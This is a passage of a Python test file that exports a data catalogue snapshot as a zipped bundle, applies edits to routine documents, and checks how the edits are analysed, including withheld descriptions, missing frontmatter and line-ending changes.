    """Export `snapshot`, apply `edit(texts, routine_path)` to its first routine, and analyze."""
    bundle = export_okf_bundle(snapshot)
    texts = {document.path: document.text for document in bundle.documents}
    key = snapshot.routines[0].key
    path = next(path for path in texts if path.endswith(f"routine-{key}.md"))
    edited = edit(texts, path)
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = [
        (f"bundle/{name}", text.encode()) for name, text in {**texts, path: edited}.items()
    ]
    members.append((MANIFEST_FILENAME, bundle.manifest_json().encode()))
    analysis = analyze_bundle_edits(
        read_import_archive(_zip(members)), snapshot=snapshot, base_documents=texts
    )
    return analysis, path, texts


def test_a_routine_purpose_becomes_a_routine_description_edit() -> None:
    """The export's baseline -- the approved version and the captured-definition version -- is
    carried from Atlas's snapshot; the file's own `capture_version` is a derived field."""
    snapshot, _bundle, _texts = _base()
    routine = replace(
        snapshot.routines[0],
        description=OkfDescription(
            state=DESCRIPTION_APPROVED,
            text="Rebuilds one day.",
            version=2,
            approval=OkfApproval("steward", "2026-09-05T00:00:00+00:00", True),
        ),
        definition=OkfDefinitionFacts(
            available=True,
            digest="b" * 64,
            truncated=False,
            lineage="ACTIVE",
            capture_version=4,
            captured_at="2026-08-01T00:00:00+00:00",
        ),
    )
    snapshot = replace(snapshot, routines=(routine, *snapshot.routines[1:]))

    def edit(texts: dict[str, str], path: str) -> str:
        return (
            texts[path]
            .replace("Rebuilds one day.[^approved-description]", "Rebuilds one day's totals.")
            .replace("capture_version: 4", "capture_version: 9")
        )

    analysis, path, _texts = _routine_analysis(snapshot, edit)
    (routine_edit,) = analysis.edits
    assert (routine_edit.kind, routine_edit.family) == (
        EDIT_ROUTINE_PURPOSE,
        FAMILY_ROUTINE_DESCRIPTION,
    )
    assert (routine_edit.path, routine_edit.subject_key) == (path, routine.key)
    assert routine_edit.proposed == "Rebuilds one day's totals."
    assert (routine_edit.base_version, routine_edit.base_definition_version) == (2, 4)
    assert FIELD_DERIVED in _codes(analysis)


def test_a_routine_without_approved_text_or_with_withheld_text() -> None:
    snapshot, _bundle, _texts = _base()
    placeholder = "Not established. No approved description of this routine exists."

    def written(texts: dict[str, str], path: str) -> str:
        return texts[path].replace(placeholder, "Rebuilds one day's totals.")

    analysis, _path, _texts = _routine_analysis(snapshot, written)
    (routine_edit,) = analysis.edits
    assert (routine_edit.base_version, routine_edit.base_definition_version) == (None, None)

    withheld = replace(
        snapshot.routines[0],
        description=OkfDescription(
            state=DESCRIPTION_WITHHELD, version=2, withheld_reason_codes=("EGRESS_SCREENING",)
        ),
    )
    snapshot = replace(snapshot, routines=(withheld, *snapshot.routines[1:]))

    def blind(texts: dict[str, str], path: str) -> str:
        start = texts[path].index("Withheld.")
        end = texts[path].index("\n", start)
        return texts[path][:start] + "A description written blind." + texts[path][end:]

    analysis, _path, _texts = _routine_analysis(snapshot, blind)
    assert analysis.edits == () and BASE_TEXT_WITHHELD in _codes(analysis)


def test_a_document_without_frontmatter_is_refused() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    body = texts[table].split("---\n", 2)[2]
    assert _document_refusals(_analyze({table: body}))[table] == FRONTMATTER_MISSING


def test_line_endings_and_a_byte_order_mark_are_not_edits() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    windows = ("\ufeff" + texts[table].replace("\n", "\r\n")).encode("utf-8")
    analysis = _analyze({table: windows})
    assert analysis.changed == 0 and analysis.notes == ()


def test_the_manifest_json_is_the_one_atlas_wrote() -> None:
    """A sanity check on the fixtures: the pure tests upload the export's own manifest."""
    _snapshot_value, bundle, _texts = _base()
    archive = read_import_archive(bundle_archive_bytes(bundle))
    assert archive.manifest == json.loads(bundle.manifest_json())
